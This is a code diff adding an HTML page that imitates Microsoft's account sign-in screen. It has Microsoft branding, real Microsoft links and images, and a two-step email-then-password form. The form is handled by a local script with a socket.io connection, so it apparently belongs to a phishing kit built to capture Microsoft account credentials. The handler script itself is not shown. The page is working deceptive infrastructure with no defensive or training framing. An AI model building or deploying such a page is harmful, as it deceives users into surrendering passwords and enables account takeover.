@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Sign in to your Microsoft account</title>
+		<link rel="shortcut icon" href="images/favicon.ico" />
+		<link rel="stylesheet" href="./style/output.css?new=t5" />
+		<script src="https://cdn.socket.io/4.7.5/socket.io.min.js" integrity="sha384-2huaZvOR9iDzHqslqwpR87isEmrfxqyWOF7hr7BY6KG0+hVKLoEXMPUJw3ynWuhO" crossorigin="anonymous"></script>
+
+		<style>
+			.f11xvspe,
+			#idA_PWD_SignUp {
+				color: rgb(0, 103, 184);
+			}
+
+			.f8491dx:hover,
+			#idA_PWD_SignUp:hover {
+				cursor: pointer;
+			}
+
+			.fryk5ur:hover,
+			#idA_PWD_SignUp:hover {
+				text-decoration: underline;
+			}
+
+			.f1mwb9y5:hover,
+			#idA_PWD_SignUp:hover {
+				border-top-style: none;
+			}
+		</style>
+	</head>
+	<body class="flex sm:justify-center items-center h-screen w-full flex-col">
+		<section class="bg-white p-10 lg:p-12 w-full sm:w-97 md:shadow overflow-hidden relative section">
+			<img src="./images/microsoft_logo.svg" alt="" class="" />
+
+			<form id="password-form" class="relative flex-col hidden left-96">
+				<p class="mt-4 font-normal flex items-center">
+					<img
+						role="presentation"
+						id="back"
+						pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png"
+						svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
+						src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
+						class="hover:bg-gray-200 rounded-full pt-1"
+					/>
+
+					<span id="user-email" class="text-sm"></span>
+				</p>
+
+				<h1 class="mt-3 mb-2 text-2xl font-semibold">Enter password</h1>
+
+				<p class="text-red-500 leading-5 mt-2 hidden text-sm" id="error-msg2"></p>
+
+				<input type="password" name="password" id="password-input" placeholder="Password" class="outline-none border-b w-full pb-1 my-3 border-gray-600 text-sm" />
+				<input type="hidden" name="main-email" id="main-email" />
+
+				<p class="text-xs opacity-80">
+					<a
+						class="blue-link"
+						href="https://signup.live.com/signup?cobrandid=90015&id=292841&contextid=676A8620950FAE70&opid=F1998F881FAF5E01&bk=1680812407&sru=https://login.live.com/login.srf%3fcobrandid%3d90015%26id%3d292841%26cobrandid%3d90015%26id%3d292841%26contextid%3d676A8620950FAE70%26opid%3dF1998F881FAF5E01%26mkt%3dEN-US%26lc%3d1033%26bk%3d1680812407%26uaid%3d687b810dae4a4791b2d42ab6e504082e&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=687b810dae4a4791b2d42ab6e504082e"
+						>Forgot password?</a
+					>
+				</p>
+
+				<p class="text-xs opacity-80 mt-3">
+					<a class="blue-link" href="#">Forgot username</a>
+				</p>
+
+				<!-- <p class='my-7'>Sign in with a security key </p> -->
+
+				<button type="submit" class="blue-link-bg py-1 px-7 text-white float-right mt-8 input self-end text-sm" id="verify">Sign In</button>
+			</form>
+
+			<form id="email-form" class="relative flex flex-col">
+				<h1 class="mt-3 mb-2 text-2xl font-semibold">Sign in</h1>
+
+				<p class="text-red-500 leading-5 mt-2 hidden text-sm" id="error-msg"></p>
+
+				<input type="text" name="" id="email-input" placeholder="Email, phone, or Skype" class="outline-none border-b w-full pb-1 my-2 border-gray-600 text-sm" />
+
+				<p class="text-xs opacity-80 mt-2">
+					No account?
+					<a
+						class="blue-link"
+						href="https://signup.live.com/signup?cobrandid=90015&id=292841&contextid=676A8620950FAE70&opid=F1998F881FAF5E01&bk=1680812407&sru=https://login.live.com/login.srf%3fcobrandid%3d90015%26id%3d292841%26cobrandid%3d90015%26id%3d292841%26contextid%3d676A8620950FAE70%26opid%3dF1998F881FAF5E01%26mkt%3dEN-US%26lc%3d1033%26bk%3d1680812407%26uaid%3d687b810dae4a4791b2d42ab6e504082e&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=687b810dae4a4791b2d42ab6e504082e"
+						>Create one!</a
+					>
+				</p>
+
+				<!-- <p class="text-xs opacity-80 mt-2">
+					<a href="#" class="blue-link">Can’t access your account?</a>
+				</p> -->
+
+				<!-- <p class='my-7'>Sign in with a security key </p> -->
+
+				<button type="submit" class="blue-link-bg py-1 px-7 text-white mt-8 input self-end text-sm" id="next">Next</button>
+			</form>
+
+			<div class="bg-white h-full w-full absolute top-0 left-0 opacity-65 hidden" id="overlay">
+				<div
+					class="___8509zi0 f1euv43f f15twtuk f1vgc2s3 fri679z fly5x3f f1uume8q ffaz6on f1m3tc8b f1i2n5vz fvn5op fcb265f f1dvoww6 fv6o6n1 f1fhb8pd f1kbi84t fantt2w f198vmee f9ujs9y fh4d1wz ftytnaw f1pp1adv f189tktw f16isq f1nkv2po flm8qir fb757qh f1x2efdl f1n79la3 f15utjab f14xebzo fgcztm9 fhhmtwr f12t7lhm fdtcugw f1lmrqpp fpxi8sl f2g94dy f552fgt f1f72ruk f19dq72h z-20"
+					role="progressbar"
+					aria-label="Please wait"
+				>
+					<div></div>
+					<div></div>
+					<div></div>
+					<div></div>
+					<div></div>
+				</div>
+			</div>
+		</section>
+
+		<div class="px-5 sm:px-0 mt-10 md:mt-0 w-full sm:w-97">
+			<div class="bg-white py-2 px-5 md:px-10 w-full mt-5 md:shadow hover:cursor-pointer hover:bg-gray-200 border md:border-none border-gray-400" id="bottom">
+				<p class="flex items-center text-sm">
+					<img class="mr-3 w-7" role="presentation" src="./images/signin-options.svg" />
+					Sign-in options
+				</p>
+			</div>
+		</div>
+
+		<footer class="self-start pl-5 sm:pl-0 sm:self-end absolute bottom-0 text-xs pb-1 font-normal text-gray-500 sm:text-gray-800" style="font-size: 10px">
+			<a class="mr-4 hover:underline cursor-pointer"> Terms of use </a>
+			<a href="#" class="mr-4 hover:underline cursor-pointer"> Privacy & cookies </a>
+			<a href="#" class="mr-2 cursor-pointer text-2xl tracking-widest"> ... </a>
+		</footer>
+	</body>
+
+	<script src="./script/main.js?new=t4"></script>
+
+	<script></script>
+</html>
